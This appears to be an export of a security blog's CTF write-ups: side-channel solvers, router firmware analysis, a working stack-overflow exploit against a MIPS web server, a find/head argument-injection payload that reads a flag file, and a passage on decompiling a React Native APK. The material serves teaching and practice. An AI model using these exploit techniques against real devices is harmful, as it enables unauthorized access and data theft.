[{"content":"Lately, I have been doing some hardware security research, specifically focusing on side channel stuff, this inspired me to write these challenges for the 0xL4ugh CTF.\nTempus Tempus is the latin word for time After spinning up the instance and connecting, we test the challenge logic.\nThe flag seems to be 9 characters long by elimination, so we know how long is the password, next step was checking the timing of the responses for the different digits.\nI decided to use bash instead of python for a change, using the following one-liner:\n1 for i in {0..9}; do cat \u0026lt;(echo \u0026#34;$i\u0026#34;) - | time nc localhost 11111 ; done We don\u0026rsquo;t use echo directly but instead use it along with stdin as parameters for cat. This keeps the connection alive after the echo, and time will give us the correct timing once the netcat connection closes.\nUsing this one-liner we can start bruteforcing the flag digit by digit:\nand the correct pin is 562951413.\n562951413 is the reverse of the first 8 digits of pi: 3.14159265 Here\u0026rsquo;s the python solver as well:\nTempus_Solver.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import time from pwn import * import string import numpy as np from tqdm import tqdm def try_letter(letter): # io = process(\u0026#34;./chal\u0026#34;) # host = \u0026#34;f3c7d0159c523472a737fce4144226a6.chal.ctf.ae\u0026#34; # io = remote(host, 443, ssl=True, sni=host) io = remote(\u0026#39;localhost\u0026#39;, 11111) io.recvuntil(\u0026#34;Please enter the pin:\\r\\n\u0026#34;) start = time.perf_counter() io.sendline(letter) io.recvuntil(\u0026#34;Analyzing...\u0026#34;) diff = time.perf_counter() - start io.close() return diff def get_timing(attempt, samples=5): times = [try_letter(attempt) for _ in range(samples)] return np.mean(times) timings = {} flag = \u0026#34;\u0026#34; charset = string.digits for i in range(9): timings.clear() for ch in tqdm(charset, position=0): timings[ch] = get_timing(flag + ch, samples=1) max_val = max(timings, key=timings.get) flag += max_val print(bytes(flag, encoding=\u0026#34;utf-8\u0026#34;)) io = remote(\u0026#39;localhost\u0026#39;, 11111) io.clean(1) io.sendline(flag) print(io.clean(1).decode()) Squinty We are given some power traces in .npy format, which we can load in Python using np.load('traces.npy'). I used Plotly to generate the following plot:\nWe can see a repeating pattern of some data followed by 5 peaks. The 5 peaks are always constant and never change, but the data before them seems to vary. Let\u0026rsquo;s call the data followed by the five peaks a \u0026lsquo;segment.\u0026rsquo; Going through our traces, we notice there are a total of 28 segments. Now, let\u0026rsquo;s focus on the first segment of our trace, which is shown below:\nBy examining closely, we can identify two distinct patterns repeated throughout the segment. We also know this is related to the square-and-multiply algorithm. I will take a moment to explain the square-and-multiply algorithm, as it is crucial for understanding this challenge.\nSquare and multiply is a modular exponentiation algorithm, and its most basic implementation is as follows:\n1 2 3 4 5 while exponent \u0026gt; 0: if exponent % 2 == 1: # If the current bit is 1 result = (result * base) % modulus # Multiply base = (base * base) % modulus # Square exponent = exponent // 2 # Move to the next bit When implemented in its most basic form, this algorithm poses a security risk, especially in the context of hardware security. The major flaw is that the operation (and power consumption) is data-dependent, meaning the operation we perform depends on the values of the exponent bits.\nThe square and multiply operations in hardware are very architecture-dependent, and there is no single way to implement them. However, most of the time, these two operations will have unique power footprints and even timings. By inspecting power traces visually, we can easily identify which operation is which and, consequently, leak the exponent bits, as they depend on the operation. The image below illustrates this concept well:\nThis means that a square pattern alone represents a 0 bit in the exponent, and a square pattern followed by a multiply pattern represents a 1. Note that this depends on the implementation; in this challenge, the multiply operation occurs before the squaring. With this information, we start looking for patterns in the segments of our provided trace.\nAccording to the challenge description, the flag starts with 0xL4ugh{, which means the first segment must correspond to the letter \u0026lsquo;0\u0026rsquo;, with an ASCII representation of 0x30 or 110000 in binary.\nA plausible hypothesis is as follows:\nWe reverse these bits since data is processed from LSB to MSB, which explains the reversed ASCII value. Here\u0026rsquo;s how we decode the second segment:\nThis decodes to \u0026lsquo;x\u0026rsquo; after reversing the bits. By repeating this operation 26 more times, we end up with the flag: 0xL4ugh{Squinting4SPA_Sucks}.\nThis attack is known as Simple Power Analysis (SPA). It is a type of power analysis where data can be visually recovered in one shot without performing differential analysis or using multiple traces.\nPower-SCAndal This challenge is inspired by a similar one created by the ChipWhisperer team. If you\u0026rsquo;re interested, I highly recommend checking out this link and doing the rest of the exercises to improve your skills in SCA/Fault Injection.\nConnecting to the challenge\u0026rsquo;s instance using netcat (or snicat) will exhibit the following behavior:\nThis outputs power traces for any input we provide. It returns an error when we input more than 8 characters and only accepts lowercase letters and digits. It\u0026rsquo;s important to note that the flag does not start with 0xL4ugh{ in this challenge. Therefore, I will start by plotting power traces and inspecting them visually.\nUsing the following code to parse the output and convert it to a NumPy array, I plotted the traces starting with the letter \u0026lsquo;a\u0026rsquo;:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from pwn import * import numpy as np context.encoding = \u0026#39;latin-1\u0026#39; def get_trace(letter): io = remote(\u0026#34;localhost\u0026#34;, 22222) io.recvuntil(\u0026#34;DEBUG\u0026gt; \u0026#34;) io.sendline(letter) io.recvuntil(\u0026#34;\\n\u0026#34;) resp = io.recvuntil(\u0026#34;]\u0026#34;) io.close() array = np.fromstring(resp.decode().strip(\u0026#34;[]\u0026#34;), sep=\u0026#34; \u0026#34;) return array trace = get_trace(\u0026#34;a\u0026#34;) plot(trace) We get very similar traces when plotting \u0026lsquo;a\u0026rsquo;, \u0026lsquo;b\u0026rsquo;, \u0026lsquo;c\u0026rsquo;, and so on. Therefore, I decided to plot all the letters from \u0026lsquo;a\u0026rsquo; to \u0026lsquo;z\u0026rsquo; and the digits from \u0026lsquo;0\u0026rsquo; to \u0026lsquo;9\u0026rsquo;, overlaying them in a single plot. Below is the result as an interactive plot:\nBy inspecting this plot, we can see a very clear outlier at the beginning of the trace, as shown in the picture below:\nThe outlier corresponds to the letter \u0026rsquo;s\u0026rsquo;, suggesting that \u0026rsquo;s\u0026rsquo; is part of our flag. We can repeat this process by appending \u0026rsquo;s\u0026rsquo; to the charset loop to find that the second correct character is \u0026lsquo;h\u0026rsquo;. However, we can automate this process with a script.\nWe\u0026rsquo;ll use a statistical metric called Sum of Absolute Differences (SAD), which is popular in side-channel analysis. It\u0026rsquo;s a measure of similarity between two traces. By picking a random trace as a reference, we can run our solver multiple times to identify the consistent result and determine our flag.\nHere\u0026rsquo;s the script to do this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from pwn import * import numpy as np import random from tqdm import trange context.encoding = \u0026#39;latin-1\u0026#39; def get_trace(letter): # host = \u0026#34;4b7339cb7c4f0e9673826d549734dae1.chal.ctf.ae\u0026#34; # io = remote(host, 443, ssl=True, sni=host) io = remote(\u0026#34;localhost\u0026#34;, 22222) io.recvuntil(\u0026#34;DEBUG\u0026gt; \u0026#34;) io.sendline(letter) io.recvuntil(\u0026#34;\\n\u0026#34;) resp = io.recvuntil(\u0026#34;]\u0026#34;) io.close() array = np.fromstring(resp.decode().strip(\u0026#34;[]\u0026#34;), sep=\u0026#34; \u0026#34;) return array passwd = \u0026#34;\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789\u0026#34; for _ in trange(8): max_sad = 0 correct_ch = \u0026#34;\u0026#34; ref = get_trace(passwd + random.choice(charset)) for ch in charset: try: sad = np.sum(abs(ref - get_trace(passwd + ch))) except: print(\u0026#34;Password is: \u0026#34;, passwd + ch) quit() if sad \u0026gt; max_sad: max_sad = sad correct_ch = ch passwd += correct_ch print(passwd) ","description":"Writeups for the Side Channel Hardware Challenges I have written for the 0xL4ugh CTF in 2024.","id":2,"section":"posts","tags":["hardware","SCA"],"title":"0xL4ugh24 Hardware Challenges Official Writeups","uri":"https://hegzploit.github.io/posts/0xl4ugh24-hw-writeups/"},{"content":"In this blog post, we\u0026rsquo;ll explore three challenges from the \u0026ldquo;Not Vulnerability Research\u0026rdquo; category in CyCTF'23, held in Cairo ICT.\nI managed to solve the first challenge during the CTF, and solved the remaining two afterwards. Be sure to check out the official writeup by the author. As of writing this, I haven\u0026rsquo;t read the author\u0026rsquo;s writeup to avoid being influenced by the intended solutions. Instead, I\u0026rsquo;ll guide you through my methodology and approach for solving these three challenges. Expect a long (but fun) ride, so prepare a cup of tea and enjoy the read!\nYou can download a copy of the challenge files which includes the router firmware from here Challenge 1 - Firmware Dump The first challenge is under the forensics category and It mentions a firmware dump, SNANDer and a datasheet, I downloaded the challenge files anyway, and I could find the following file structure:\nso, I just went a ran binwalk against the firmware, cuz what\u0026rsquo;s the worst that can happen right?\nRunning binwalk produced this file system:\nIt seems like something is very wrong here. For some reason, we have a lot of jffs2 file systems. I tried to grep for the flag using find -type f -exec strings {} \\; | grep cyctf, but I ended up with a bunch of fake flags that were probably unrelated to the current challenge. I also found nothing in the /etc directory, which was mentioned in the challenge description. Therefore, we need to stop being hasty and start doing some actual analysis.\nGoing back to the files were were provided, we also have SNANDer-output.txt which contains the following text:\n$ SNANDer -d -г fw_dump.bin SNANDer - Serial Nor/nAND/Eeprom programmeR v.1.7.8b2 by McMCC \u0026lt;mcmcc@mail.ru\u0026gt; Found programmer device: WinChipHead (WCH) - CH341A Device revision is 3.0.4 spi_nand_probe: mfr_id = 0xef, dev_id = 0xaa, dev_id_2 = 0x21 Get Status Register 1: 0x81 Get Status Register 2: 0×18 Disable Flash ECC. Detected SPI NAND Flash: WINBOND W25N01G, Flash Size: 128MB, OOB Size: 64B READ: Read addr = 0x0000000000000000, len = 0x0000000008000000 Read 100% [138412032] of [138412032] bytes After careful reading of this text file and a quick google search, It seems to be a log of the command used to dump the firmware and I could arrive at the following conculsions:\nSNANDer is an EEPROM programmer The -r flag was used to read a chip\u0026rsquo;s data and save it to the disk The -d flag disabled the internal ECC of the EEPROM during the process of dumping the chip\u0026rsquo;s data (more on this later) The EEPROM we are currently dealing with is the WINBOND W25N01G But what is even an EEPROM? We could find the product page for the EEPROM, It states and I quote:\n1Gb Serial NAND Flash Memory with uniform 2KB+64B page size and set Buffer Read Mode as default\nSo, this is not just a random EEPROM, It\u0026rsquo;s specifically a NAND flash, a type of non volatile memory where the memory cells are arranged in a special way that differ from It\u0026rsquo;s counterpart\u0026ndash;The NOR flash.\nFor more information about the difference between NAND and NOR flash memory, have a look at this wikipedia page: https://en.wikipedia.org/wiki/Flash_memory#Distinction_between_NOR_and_NAND_flash Another interesting property of EEPROMs is the method of bit erasure. Unlike simply clearing a bit or a word by setting it to zero, you can only work with blocks. The default state of an erased block is all 1\u0026rsquo;s. Therefore, you initially start with all 1\u0026rsquo;s and progressively write zeroes. This detail will be very important later.\nWhat about the ECC thingy? Now, that we understand what we are dealing with, we gotta start understanding the purpose of the weird -d flag that has something to do with ECC and OOB as mentioned in the help text of SNANDer.\nInformation Theory goes brrrrrrrr I want to take this chance as an excuse to blaber a little about information theory, In 1948, Claude Shannon published the paper \u0026ldquo;A Mathematical Theory of Communication\u0026rdquo; in which he established the foundation of the modern age of computers, in his infamous paper, he defined the basic elements of communication, developed the concept of entropy, and he even coined the term \u0026ldquo;bit\u0026rdquo;, some say that his work led to all the current developments of what we know today as \u0026ldquo;Digital Communication\u0026rdquo; and the Internet of course!\nAnyway, enough talk about Shannon, right now, we are going to talk about the simplest error detection algorithm: The Parity Check.\nIn its simplest form, Parity works by appending a bit to the word we are currently transmitting. This bit is either set to zero or one, depending on the number of 1\u0026rsquo;s in the message. If there is an even number of 1\u0026rsquo;s, we keep the parity bit at 0. If there is an odd number of 1\u0026rsquo;s, we set the parity bit to 1, effectively making the total number of 1\u0026rsquo;s even. Then, at the receiver\u0026rsquo;s end, we take note the parity bit\u0026rsquo;s value then recalculate it. If the result matches the original value of the parity bit, then the message is either intact and free of errors, or it contains more than one error, which the parity bit can never detect.\nIf you didn\u0026rsquo;t understand the above, It doesn\u0026rsquo;t matter for understanding the rest of the blog and I don\u0026rsquo;t want to spend more time talking about parity, so let\u0026rsquo;s keep going. Error Correction.\nError Correction is the other side of the coin. What if we\u0026rsquo;re not satisfied with merely detecting whether an error occurred? What if we are so greedy that we also want to pinpoint the exact position of that error to correct it? That\u0026rsquo;s where Hamming Codes come in to save the day.\nThe Hamming code is an algorithm that can not only detect errors but also correct them. It functions similarly to parity checks, but with more than one parity bit in action, which intersect each other. 3Blue1Brown and Ben Eater have two awesome videos about the concept of Hamming codes and how they can be implemented in hardware, both of which are very worth watching.\nError correction is not limited to only hamming codes, there are better and more modern ECC or Error Correcting Codes such as the Reed\u0026ndash;Solomon codes (which are used in DVDs) or BCH Codes, and the list goes on.\nIn conclusion, Error Correcting Codes (ECC) are generally implemented by having some redundant data besides the actual message or data that we are sending, this spare data helps us to detect and even correct errors at the receiving end.\nGoing back to our challenge, the -d flag mentions after disabling the internal ECC of chip (which is implemented in the hardware of the chip itself by the way!), It will write one page, then the \u0026ldquo;OOB\u0026rdquo; section. OOB is short for Out-Of-Bounds and It is often used when referring to the the redundant data that is used for error correction. Some datasheets refer to OOB data as the \u0026ldquo;Spare Area\u0026rdquo;, but you get the idea.\nSince I want to get a better understanding of the memory page structure of this chip, I navigated the datasheet which had a section containing this block diagram of the page layout.\nIt becomes clear that the memory page constitutes of 2048 bytes of main memory proceeded by 64 bytes of \u0026ldquo;Spare Area\u0026rdquo; which is another word for the OOB area, but we know that ECC is disabled, so I decided to have a look at the firmware dump we were provided using a hex editor.\nWe notice that right around the 2048 bytes offset, we have a bunch of 1s until byte number 2112, which is exactly 64 bytes. Aha, that\u0026rsquo;s the culprit.\nSolution I wrote a small Python script that will just loop over the pages and write only 2048 bytes, effectively skipping the ECC junk.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def extract_data_pages(input_file_path, output_file_path): PAGE_SIZE = 2048 OOB_SIZE = 64 ## Size of the OOB area of a page with open(input_file_path, \u0026#39;rb\u0026#39;) as input_file, open(output_file_path, \u0026#39;wb\u0026#39;) as output_file: while True: data = input_file.read(PAGE_SIZE) if not data: break output_file.write(data) input_file.seek(OOB_SIZE, 1) input_firmware = \u0026#34;./fw_dump.bin\u0026#34; output_firmware = \u0026#34;./new_fw.bin\u0026#34; extract_data_pages(input_firmware, output_firmware) and running it, we get a new fille `new_fw.bin, which, upon extracting its contents using binwalk, we can now see only two file jffs2 file systems:\nand by going to any of these filesystems, we can find an interesting file in the /etc directory.\nand by recursively extracting Its contents, we can read the flag.\nChallenge 2 - Management Portal The second challenge has the pwn tag which is very interesting, It also seems to depend on the filesystem that we extracted from the first challenge, so let\u0026rsquo;s first try to connect to the remote instance that we were provided.\nIt turns out to be an endpoint for the router\u0026rsquo;s admin panel.\nI did some testing with larger input, and we got some reaction.\nI wasn\u0026rsquo;t sure If that is a segmentation fault and we can already crash the binary or this is intended behavior that is handeled on the backend\u0026rsquo;s side, so let\u0026rsquo;s keep diging more.\nI went to our extracted jffs2 filesystem and decided to check the /bin directory for any interesting binaries.\nAll of the files were symlinks to busybox except these 4 binaries:\nbusybox httpd clid init Since we are dealing with a web server here, it makes the most sense to investigate the httpd binary, so I ran it against the file command.\nWe can see that we are dealing here with a MIPS 32-bit binary that is big endian (hence the MSB executable part), so, let\u0026rsquo;s get going with reverse engineering it in IDA.\nI started by checking the functions that we have.\nWe could see functions for handling the HTTP routes for the web server, so we are probably interested in the function responsible for the login\u0026rsquo;s POST request, which is called POSTLogin.\nWe can see some hardcoded credentials in the decompilation, so I just went ahead and tried to log in using these credentials. I got in, so I started testing the functionality of the website.\nBesides getting rickrolled, the functionality was pretty boring. All routes are just GET requests that we probably can\u0026rsquo;t interact with, and since I know this is probably a binary exploitation challenge, the most exciting thing for me was the login page. This page takes input from the user and sends it to the server using a POST request. This is probably the only endpoint that can take our input, so if there is a vulnerability, this is more likely to be the place to trigger it.\nAfter digging deeper into the code, I found the following function:\nI went inside the jffs2 filesystem and found the referenced flag.txt file. However It contained a fake flag so this probably means that this function should be our target, there was no xref to this function so If we can get the server to execute it somehow on the remote instance, we will have our flag.\nOne of the biggest consequences of a buffer overflow vulnerability is Control Flow Hijacking, which can allow us to run any code we want in the binary, this is achieved by overwriting the saved return address on the stack with another function address that we want to execute instead. Going back to the POSTLogin function, I did more reverse engineering of the code and renamed some variables, so, we end up with this decompilation:\nIt can be summarized as follows:\nThe variable payload_length stores the length of our POST request payload, which is whatever comes after the HTTP headers If our payload is greater than 80, the sever will just return an Internal Server Error, just as we saw in our earlier test, so this means that we haven\u0026rsquo;t crashed the server yet, the error was normal behavior that is getting handled by the server. The function then checks the content of the payload to ensure it contains the correct username and password. If the payload is too short or does not contain the correct credentials, the function sets the login flag to 0 and redirects the user to the login page. Oddly enough, the memcpy operation copies our payload into a stack buffer named buf, and the size of the memcpy is determined by the content_length variable. This is a global variable set to the value of the Content-Length header. from point 4, we can clearly control the size of the memcpy by spoofing the Content-Length of the request. This is one vulnerability! However, I had a big problem: I couldn\u0026rsquo;t really craft a payload greater than 79 characters, and in order to overwrite the return address, I need more than that. This renders the first vulnerability that we found useless (╯°□°)╯︵ ┻━┻\nI started staring at the code for hours and hours until something clicked, I found a second vulnerability.\nThe payload_length is calculated using strlen() which stops at a null terminator! If we can insert a null byte early in our payload, then we can trick strlen into thinking our payload_length is less than 80, effectively passing that check at line 7. so, by chaining these two vulnerabilities, we can possibly crash the server! so let\u0026rsquo;s test that locally.\nI ran a local instance of the server using qemu-mips-static:\nThen I used pwntools to send a payload that should crash the server.\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * io = remote(\u0026#34;localhost\u0026#34;, 10080) payload = \u0026#34;POST /login HTTP/1.1\\r\\n\u0026#34; \\ \u0026#34;Host: localhost:10080\\r\\n\u0026#34; \\ \u0026#34;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#34; \\ f\u0026#34;Content-Length: 200\\r\\n\u0026#34; \\ \u0026#34;\\r\\n\u0026#34; \\ f\u0026#34;user=admin\u0026amp;pass=notcomplexjustnotguessable\\0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34;.encode() io.send(payload) and voila, we get a crash!\nExploitation Now, that we could crash the binary, writing the exploit should be straight forward.\nLuckily, a lot of binaries used in embedded systems have most security mitigation disabled, we can confirm this by running checksec on the binary that we have.\nAnd as we expected, we can see PIE is disabled, so this means that there will be no randomization of code addresses.\nNow, we already know what function we want to execute, namely, the readFlag function, but we have one problem, we still don\u0026rsquo;t know the offset for the return address stored on the stack, so we don\u0026rsquo;t know how much should we overflow before corrupting the saved return address.\nNow, I could\u0026rsquo;ve went ahead and calculated it like an educated person, but I just wrote a fuzzer that will find me the offset. (this reminds me of this XKCD)\nhere\u0026rsquo;s the code for my fuzzer:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from pwn import * elf = ELF(\u0026#34;./_new_fw.bin.extracted/jffs2-root/bin/httpd\u0026#34;) context.binary = elf.path def login(offset, content_length=200): with remote(\u0026#34;localhost\u0026#34;, 10080) as io: header = ( \u0026#34;POST /login HTTP/1.1\\r\\n\u0026#34; \u0026#34;Host: localhost:10080\\r\\n\u0026#34; \u0026#34;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#34; f\u0026#34;Content-Length: {content_length}\\r\\n\\r\\n\u0026#34; ) body = ( \u0026#34;user=admin\u0026amp;pass=notcomplexjustnotguessable\\0\u0026#34; + \u0026#34;A\u0026#34; * offset + p32(elf.sym[\u0026#39;readFlag\u0026#39;]).decode() ) payload = (header + body).encode() + b\u0026#34;\\r\\n\u0026#34; io.send(payload) response = io.clean().replace(b\u0026#34;\\r\\n\u0026#34;, b\u0026#34;\\n\u0026#34;).decode() if \u0026#34;cyctf\u0026#34; in response: print(f\u0026#34;Response:\\n{response}\u0026#34;) return False return True def main(): for i in range(1, 100): if not login(i): print(f\u0026#34;Offset: {i}\u0026#34;) break if __name__ == \u0026#34;__main__\u0026#34;: main() And the output:\nUsing IDA to find the offset We can easily find the offset in IDA from the stack view. Simply double-click on the stack variable buf, and you will see its offset from the base pointer var_s0 in hexadecimal next to it. By adding 4 bytes to this value, we can obtain our offset.\nvar_s0 is the base pointer and var_s4 is the return address:\nSo, we can just run our exploit with the offset 45 against the remote server to get the flag, here\u0026rsquo;s the final exploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from pwn import * elf = ELF(\u0026#34;./_new_fw.bin.extracted/jffs2-root/bin/httpd\u0026#34;) context.binary = elf.path def login(offset=45, content_length=200): io = remote(\u0026#34;cyctf23-11acfb59ca02-low-budget-router-ma-0.chals.io\u0026#34;, 443, ssl=True) header = ( \u0026#34;POST /login HTTP/1.1\\r\\n\u0026#34; \u0026#34;Host: localhost:10080\\r\\n\u0026#34; \u0026#34;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#34; f\u0026#34;Content-Length: {content_length}\\r\\n\\r\\n\u0026#34; ) body = ( \u0026#34;user=admin\u0026amp;pass=notcomplexjustnotguessable\\0\u0026#34; + \u0026#34;A\u0026#34; * offset + p32(elf.sym[\u0026#39;readFlag\u0026#39;]).decode() ) payload = (header + body).encode() + b\u0026#34;\\r\\n\u0026#34; io.send(payload) resp = io.clean(1).replace(b\u0026#34;\\r\\n\u0026#34;,b\u0026#34;\\n\u0026#34;).decode() io.close() return resp print(login()) And, we get the flag!\nChallenge 3 - Management Console The third challenge has the rev tag, so we will probably do even more reversing, sounds fun so let\u0026rsquo;s first start with connecting to the remote instance that we are provided using snicat (which is a clone of netcat by the ctfd team except Its encrypted).\nOn attempting to log in, It seems that I have to input the correct username and password, so let\u0026rsquo;s start the initial reversing!\nIf you remember, we found a couple of binaries that were interesting in the /bin directory, and one of them was clid, this could be a good starting point for us, so I loaded it in IDA and found the main function to be setting up a multi-threaded server that handles incoming client connections through a function called handleClient.\nSo I went ahead to that function and found that it basically checks If a user is authenticated using the authenticate() function, Authenticated users are then given an \u0026ldquo;interactive shell\u0026rdquo; through the interactiveShell() function.\nBefore checking that interactiveShell() function, I decided to check the authentication logic, however, It seems that the logic is implemented in an external function called doAuthentication().\nI used readelf to check the library dependencies (If you know a better way to do this in IDA please let me know in the comments)\nFrom the readelf output, I could find two interesting external libraries, libcli_functions.so and libcli_helpers.so so I went to the /lib directory and found them, after loading libcli_function.so in IDA, I could find the definition of the doAuthentication() function.\nGoing back to our snicat connection and entering these credentials, I was successfully logged in and found myself in some sort of interactive shell, so I instinctively ran help with high hopes, and luckily, I got some help text.\nAt this point, commands like readflag no longer surprise me, but driven by curiosity, I tried to run it anyway, because, as they say, curiosity killed the cat.\nI will leave the YouTube link as an exercise for the reader \u0026ndash;\u0026gt; https://www.youtube.com/watch?v=dQw4w9WgXcQo\nI also tested the rest of the commands in the help text of the CLI but could find nothing of interest.\nIt seems we are locked in some sort of jail, I wasn\u0026rsquo;t really sure on where to go from there, part of me wanted to try escaping that jail and another part thought that this may be a rabbit hole, so I decided to play the sure game and do more reverse engineering and see what we end up with.\nI went back to the clid binary in IDA and had a look at the implementation of the interactiveShell() function, I could find the logic responsible for handling each of the commands in the shell.\nand surprisignly, I found two undocumented functions that were not visible in the help text, the first function is setdiag (set diagnostics?) and the second one was head.\nI went to the libcli_helpers.so and started digging in their implementation.\ndissecting setdiag() This functions seems to toggle a boolean variable called diag in the .bss segment. This gloal variable diag seems to be referenced in the implementation of ping\nIt seems that the ping function will work when we use the setdiag command, and the output of the ping command will be saved in /tmp/ping_log, so let\u0026rsquo;s confirm this.\nWe could successfully run the ping command, this seems promising, so I went ahead and started trying command injection as it seems to directly run ping with our argument using the custom function execCmd().\nIt seemed that there was some handling of command injection in place, so I decided to check the execCmd() function which is implemented in libcli_helpers.so`\nI couldn\u0026rsquo;t find anything of interest in the execCmd() function except that it handles command injection, which makes sense.\nI decided to have a look at head() which is another undocumented function in the interactive shell.\ndissecting head() This function seems to take two arguments. The second argument is a path to a file within the /tmp directory, while the first argument is the number of lines it will print of that file using the head linux command, so let\u0026rsquo;s test this out!\nI had a feeling that the ping command using tee to save Its output to /tmp is no mere coincidence, and we should somehow use that file with the head command to get the flag.\nI threw a bunch of stuff at the head command but nothing worked, It seemed to only accept files within /tmp and the flag should be at /home/clid/flag.txt so it was impossible to read the flag using head the intended way, but what about an unintended way?\nI started trying to inject stuff again. I knew that I couldn\u0026rsquo;t inject commands with the usual ; or \u0026amp;\u0026amp; tricks, so I thought about injecting arguments!\nWe know that we have control of two arguments within the command: find /tmp/ -user 1002 -type f -path %s -exec head -n%s \\\u0026quot;{}\\\u0026quot; \\\\;\nwe control the path of the find command we control the number of lines printed from the head command I observed that the head command is executed only on the output of the find command, using the -exec argument. This means we are limited to specifying /tmp/ping_log as the second argument to ensure head executes. Consequently, it seemed logical for me to attempt injection into the first argument, which controls the number of lines fed into the head command.\nAnother thing that I remembered is the fact that head works on multiple files like this:\nso, we can just specify the number of lines as usual and then add the path for the flag, and I got this payload: head 3 /home/clid/flag.txt,/tmp/ping_log\nTadaaa!\nWhile chatting with the author about my solution, It turns out my payload wasn\u0026rsquo;t an inteded solution when he was desining the challenge, he had in mind something like: head 1\u0026quot;,/tmp/ping_log -exec cat /home/clid/flag.txt \u0026quot; which is also argument injection except he does it on find itself and not head as we did. Anyway you can check his official writeup in the second paragraph of this page for more details on his solution. I really enjoyed the three of these challenges, and I could tell how much effort was put into creating them, so props to the author for such unique scenarios!\n","description":"A series of three challenges involving forensics, pwn and reverse engineering of a router firmware","id":3,"section":"posts","tags":["hardware"],"title":"Low Budget Router","uri":"https://hegzploit.github.io/posts/lbr/"},{"content":"I started by installing the APK on an android phone, once opened it will show a text field to enter a key and a login button, the APK will try to navigate to https://you-shall-not-pass when trying to type any key (maybe this was done to prevent bruteforcing the key?), finally, when you try to login with a random key It will show a dialog saying \u0026ldquo;BAAAD Key\u0026rdquo;\nI dropped the APK within jadx and I went to the entry point which is com.expor4bb1t.AwesomeProject.MainActivity, I could see a lot of imports related to facebook and react, which along with the challenge name, started making sense. This application is built with react native.\nIt turns out that react native applications basically can run java script code that is located in assets/index.android.bundle\nHowever, in our case, the javascript code was compiled into what is called \u0026ldquo;Hermes Bytecode\u0026rdquo;, which is run by a custom javascript engine.\nThis bytecode makes the application faster but is gibberesh to humans, this is why we have to either disassemble it into readable hermes assembly, or even better, we can decompile it into javascript.\nI found https://github.com/bongtrop/hbctool which is a disassembler for the hermes bytecode, however It didn\u0026rsquo;t work for me as It only supports up to version 85 of the bytecode, and our apk seems to be version 94 so the tool errors out.\nPS C:\\Users\\hegzp\\Downloads\\ReactiveVaultStuff\\assets\u0026gt; hbctool disasm .\\index.android.bundle out.hasm [*] Disassemble \u0026#39;.\\index.android.bundle\u0026#39; to \u0026#39;out.hasm\u0026#39; path Traceback (most recent call last): ... \u0026lt;snip\u0026gt; ... AssertionError: The HBC version (94) is not supported. I found this writeup where that author faced a similar problem, and apparently, adding support for newer versions shouldn\u0026rsquo;t be that hard, but I decided to dig a little more and I found this repo, It is basically a decompiler for hermes and they even support our bytecode version.\nI ran the tool on the index.android.bundle using hbc-decompiler.exe .\\index.android.bundle out.js to get a decompilation of the bytecode.\nOnce I found this decompiled code, I did a search for the BAAAD Key string that we saw in the APK earlier, and I found one result.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 case 0: r1 = _closure2_slot0; if(r1) { _fun7649_ip = 31; continue _fun7649 } case 10: r1 = global; r3 = r1.alert; r2 = undefined; r1 = \u0026#39;Empty Inputt!!\u0026#39;; r1 = r3.bind(r2)(r1); _fun7649_ip = 91; continue _fun7649; case 31: r2 = _closure2_slot2; r1 = _closure2_slot3; r1 = r2 + r1; r0 = _closure2_slot0; if(!(r0 !== r1)) { _fun7649_ip = 72; continue _fun7649 } case 51: r0 = global; r2 = r0.alert; r1 = undefined; r0 = \u0026#39;BAAAD Key\u0026#39;; r0 = r2.bind(r1)(r0); _fun7649_ip = 91; continue _fun7649; case 72: r0 = global; r2 = r0.alert; r1 = undefined; r0 = \u0026#39;Congratssss!\u0026#39;; r0 = r2.bind(r1)(r0); This seems to be some sort of switch logic for the login button, I did some more digging then I found this suspicious piece of code, It was just above the login switch logic that we discussed in the above paragrarph.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 case 0: r0 = a0; r0 = r0.navigation; r1 = _closure1_slot3; r2 = r1.useState; r3 = undefined; r1 = \u0026#39;\u0026#39;; r4 = r2.bind(r3)(r1); r1 = _closure1_slot2; r2 = r1.default; r1 = 2; r4 = r2.bind(r3)(r4, r1); r2 = 0; r5 = r4[r2]; r2 = 1; r4 = r4[r2]; r30 = \u0026#34;Within a vault, a secret\u0026#39;s hidden tight,\u0026#34;; r6 = 20; r28 = r30[r6]; r11 = \u0026#39;LocKed aw4y, in shadows it does hide,\u0026#39;; r2 = 10; r2 = r11[r2]; r27 = r30[r6]; r26 = r30[r1]; r13 = \u0026#34;The alphabet\u0026#39;s secrets take their flight.\u0026#34;; r12 = 34; r25 = r13[r12]; r29 = \u0026#34;From {\u0026#39;A\u0026#39;} to {\u0026#39;Z\u0026#39;} the secrets share.\u0026#34;; r7 = 5; r24 = r29[r7]; r1 = 3; r23 = r30[r1]; r9 = 19; r22 = r30[r9]; r6 = 21; r21 = r30[r6]; r20 = r29[r1]; r6 = \u0026#39;In this hidd3N space, both dark and bright!\u0026#39;; r10 = 12; r19 = r6[r10]; r15 = 18; r18 = r30[r15]; r31 = \u0026#39;A treasure trove of tales, far and wide_\u0026#39;; r14 = 39; r17 = r31[r14]; r1 = r30[r1]; r6 = 9; r16 = 